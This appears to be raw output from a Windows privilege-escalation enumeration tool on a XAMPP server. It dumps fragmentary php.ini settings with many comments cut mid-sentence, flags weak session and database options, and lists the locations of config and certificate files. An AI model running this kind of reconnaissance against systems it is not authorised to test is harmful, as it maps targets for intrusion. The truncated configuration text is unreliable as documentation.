;     session.save_path = "N;MODE;/path"
; where MODE is the octal representation of the mode. Note that this
; http://php.net/session.save-path
session.save_path="C:\xampp\tmp"
; Whether to use strict session mode.
; Strict session mode does not accept uninitialized session ID and regenerate
; session ID if browser sends uninitialized session ID. Strict mode protects
; applications from session fixation via session adoption vulnerability. It is
; https://wiki.php.net/rfc/strict_sessions
session.use_strict_mode=0
; http://php.net/session.use-cookies
session.use_cookies=1
; http://php.net/session.cookie-secure
;session.cookie_secure =
; This option forces PHP to fetch and use a cookie for storing and maintaining
; the session id. We encourage this operation as it's very helpful in combating
; session hijacking when not specifying and managing your own session id. It is
; not the be-all and end-all of session hijacking defense, but it's a good start.
; http://php.net/session.use-only-cookies
session.use_only_cookies=1
; Name of the session (used as cookie name).
; http://php.net/session.name
session.name=PHPSESSID
; Initialize session on request startup.
; http://php.net/session.auto-start
session.auto_start=0
; Lifetime in seconds of cookie or, if 0, until browser is restarted.
; http://php.net/session.cookie-lifetime
session.cookie_lifetime=0
; http://php.net/session.cookie-path
session.cookie_path=/
; http://php.net/session.cookie-domain
session.cookie_domain=
; Whether or not to add the httpOnly flag to the cookie, which makes it inaccessible to browser scripting languages such as JavaScript.
; http://php.net/session.cookie-httponly
session.cookie_httponly=
; http://php.net/session.serialize-handler
session.serialize_handler=php
; Defines the probability that the 'garbage collection' process is started
; on every session initialization. The probability is calculated by using
; gc_probability/gc_divisor. Where session.gc_probability is the numerator
; and gc_divisor is the denominator in the equation. Setting this value to 1
; when the session.gc_divisor value is 100 will give you approximately a 1% chance
; the gc will run on any give request.
; Production Value: 1
; http://php.net/session.gc-probability
session.gc_probability=1
; Defines the probability that the 'garbage collection' process is started on every
; session initialization. The probability is calculated by using the following equation:
; gc_probability/gc_divisor. Where session.gc_probability is the numerator and
; session.gc_divisor is the denominator in the equation. Setting this value to 1
; when the session.gc_divisor value is 100 will give you approximately a 1% chance
; the gc will run on any give request. Increasing this value to 1000 will give you
; a 0.1% chance the gc will run on any give request. For high volume production servers,
; Production Value: 1000
; http://php.net/session.gc-divisor
session.gc_divisor=1000
; After this number of seconds, stored data will be seen as 'garbage' and
; cleaned up by the garbage collection process.
; http://php.net/session.gc-maxlifetime
session.gc_maxlifetime=1440
; NOTE: If you are using the subdirectory option for storing session files
;       (see session.save_path above), then garbage collection does *not*
;       collection through a shell script, cron entry, or some other method.
;       setting session.gc_maxlifetime to 1440 (1440 seconds = 24 minutes):
;          find /path/to/sessions -cmin +24 -type f | xargs rm
; Check HTTP Referer to invalidate externally stored URLs containing ids.
; HTTP_REFERER has to contain this substring for the session to be
; considered as valid.
; http://php.net/session.referer-check
session.referer_check=
; http://php.net/session.entropy-length
session.entropy_length=0
; Specified here to create the session id.
; http://php.net/session.entropy-file
; On systems that don't have /dev/urandom but do have /dev/arandom, this will default to /dev/arandom
; On windows, setting the entropy_length setting will activate the
;session.entropy_file = /dev/urandom
; http://php.net/session.cache-limiter
session.cache_limiter=nocache
; http://php.net/session.cache-expire
session.cache_expire=180
; Use this option with caution.
; - User may send URL contains active session ID
;   to other person via. email/irc/etc.
; - URL that contains active session ID may be stored
; - User may access your site with the same session ID
; http://php.net/session.use-trans-sid
session.use_trans_sid=0
; Select a hash function for use in generating session ids.
; This option may also be set to the name of any hash function supported by
; the hash extension. A list of available hashes is returned by the hash_algos()
; function.
; http://php.net/session.hash-function
session.hash_function=0
; Define how many bits are stored in each character when converting
; Production Value: 5
; http://php.net/session.hash-bits-per-character
session.hash_bits_per_character=5
; to URLs.  If you want XHTML conformity, remove the form entry.
; Production Value: "a=href,area=href,frame=src,input=src,form=fakeentry"
; Enable upload progress tracking in $_SESSION
; Default Value: On
; Development Value: On
; Production Value: On
; http://php.net/session.upload-progress.enabled
;session.upload_progress.enabled = On
; Cleanup the progress information as soon as all POST data has been read
; Default Value: On
; Development Value: On
; Production Value: On
; http://php.net/session.upload-progress.cleanup
;session.upload_progress.cleanup = On
; A prefix used for the upload progress key in $_SESSION
; Production Value: "upload_progress_"
; http://php.net/session.upload-progress.prefix
;session.upload_progress.prefix = "upload_progress_"
; The index name (concatenated with the prefix) in $_SESSION
; containing the upload progress information
; Default Value: "PHP_SESSION_UPLOAD_PROGRESS"
; Development Value: "PHP_SESSION_UPLOAD_PROGRESS"
; Production Value: "PHP_SESSION_UPLOAD_PROGRESS"
; http://php.net/session.upload-progress.name
;session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
; Production Value: "1%"
; http://php.net/session.upload-progress.freq
;session.upload_progress.freq =  "1%"
; The minimum delay between updates, in seconds
; Production Value: 1
; http://php.net/session.upload-progress.min-freq
;session.upload_progress.min_freq = "1"
mssql.allow_persistent=On
; Maximum number of links (persistent+non persistent).  -1 means no limit.
; Compatibility mode with old versions of PHP 3.0.
; Connect timeout
;mssql.connect_timeout = 5
; Limits the number of records in each batch.  0 = all records in one batch.
; On => Returns data converted to SQL server settings
;mssql.datetimeconvert = On
; Use NT authentication when connecting to the server
mssql.secure_connection=Off
; If empty or not set the client charset from freetds.conf is used
; This is only used when compiled with FreeTDS
[Assertion]
;assert.active = On
; Issue a PHP warning for each failed assertion.
;assert.warning = On
; Don't bail out by default.
; User-function to be called if an assertion fails.
; Eval the expression with current error_reporting().  Set to true if you want
; path to a file containing GUIDs, IIDs or filenames of files with TypeLibs
; autoregister constants of a components typlib on com_load()
; register constants casesensitive
; show warnings on duplicate constant registrations
; language for internal character representation.
; If empty, default_charset or internal_encoding or iconv.internal_encoding is used.
; The precedence is: default_charset < internal_encoding < iconv.internal_encoding
; mbstring.encoding_traslation = On is needed to use this setting.
; mb_output_handler must be registered as output buffer to function.
; To use an output encoding conversion, mbstring's output handler must be set
; otherwise output encoding conversion cannot be performed.
; enable automatic encoding translation according to
; converted to internal encoding by setting this to On.
; Note: Do _not_ use automatic encoding translation for
;       portable libs/applications.
; http://php.net/mbstring.encoding-translation
;mbstring.encoding_translation = Off
; automatic encoding detection order.
; substitute_character used when character cannot be converted
; one from another
;mbstring.substitute_character = none
; overload(replace) single byte functions by mbstring functions.
; etc. Possible values are 0,1,2,4 or combination of them.
; 1: Overload mail() function
; 2: Overload str*() functions
; 4: Overload ereg*() functions
; enable strict encoding detection.
;mbstring.strict_detection = On
; This directive specifies the regex pattern of content types for which mb_output_handler()
; Default: mbstring.http_output_conv_mimetype=^(text/|application/xhtml\+xml)
;mbstring.http_output_conv_mimetype=
; With mbstring support this will automatically be converted into the encoding
; given by corresponding encode setting. When empty mbstring.internal_encoding
; The path to a default tidy configuration file to use when using tidy
; http://php.net/tidy.default-config
;tidy.default_config = /usr/local/lib/php/default.tcfg
; WARNING: Do not use this option if you are generating non-html content
; Sets the directory name where SOAP extension will put cache files.
; (time to live) Sets the number of second while cached file will be used
; instead of original one.
; For more information about mcrypt settings see http://php.net/mcrypt-module-open
; Determines if Zend OPCache is enabled for the CLI version of PHP
;opcache.memory_consumption=64
; Only numbers between 200 and 100000 are allowed.
; directory to the script key, thus eliminating possible collisions between
; performance, but may break existing applications.
; How often (in seconds) to check file timestamps for changes to the shared
; memory storage allocation. ("1" means validate once per second, but only
; once per request. "0" means always validate)
; Enables or disables file search in include_path optimization
; may be always stored (save_comments=1), but not loaded by applications
; that don't need them anyway.
;opcache.optimization_level=0xffffffff
; The location of the OPcache blacklist file (wildcards allowed).
; Allows exclusion of large files from being cached. By default all files
;opcache.consistency_checks=0
; How long to wait (in seconds) for a scheduled restart to begin if the cache
; By default, only fatal errors (level 0) or errors (level 1) are logged.
; Protect the shared memory from unexpected writing during script execution.
; Useful for internal debugging only.
; Validate cached file permissions.
; opcache.validate_permission=0
; Prevent name collisions in chroot'ed environment.
; A default value for the CURLOPT_CAINFO option. This is required to be an
; The location of a Certificate Authority (CA) file on the local filesystem
; be overridden on a per-stream basis via the "cafile" SSL stream context
; option.
; this value may still be overridden on a per-stream basis via the "capath"
; SSL stream context option.
[Session]
date.timezone=Europe/Berlin
mysql.allow_local_infile=On
mysql.allow_persistent=On
mysql.connect_timeout=3
sybct.allow_persistent=On
mssql.allow_persistent=On
mssql.secure_connection=Off


����������͹ Found PHP_files Files
File: C:\xampp\php\pear\PHPUnit\Util\Configuration.php
File: C:\xampp\php\pear\PHP\Debug\Renderer\HTML\DivConfig.php
File: C:\xampp\php\pear\PHP\Debug\Renderer\HTML\TableConfig.php
File: C:\xampp\php\pear\PEAR\Command\Config.php
File: C:\xampp\php\pear\PEAR\Config.php
File: C:\xampp\php\scripts\configure.php
File: C:\xampp\php\pear\Table\Storage.php

����������͹ Found Moodle Files
File: C:\xampp\php\pear\PEAR\Command\Config.php
File: C:\xampp\php\pear\PEAR\Config.php

����������͹ Found CERTSB4 Files
File: C:\xampp\apache\bin\curl-ca-bundle.crt
File: C:\xampp\apache\conf\ssl.crt
[########--]  83% -                                                                                                                                                                                                            

```